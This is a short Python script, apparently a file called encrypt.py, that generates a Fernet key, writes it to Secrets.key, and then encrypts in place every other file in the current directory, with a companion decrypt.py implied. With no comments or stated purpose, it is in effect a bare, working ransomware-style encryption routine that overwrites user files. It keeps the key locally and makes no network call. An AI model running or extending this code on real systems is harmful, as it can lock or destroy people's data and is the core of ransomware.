import os
from cryptography.fernet import Fernet

files = [f for f in os.listdir() if (f != "encrypt.py" and f != "decrypt.py" and f != "Secrets.key" and os.path.isfile(f))]

secret = Fernet.generate_key()

with open("Secrets.key", "wb") as key:
    key.write(secret)
key.close()

for f in files:
    with open(f, "rb") as file:
        content = file.read()
    file.close()
    contentModified = Fernet(secret).encrypt(content)
    
    with open(f, "wb") as file:
        file.write(contentModified)
    file.close()
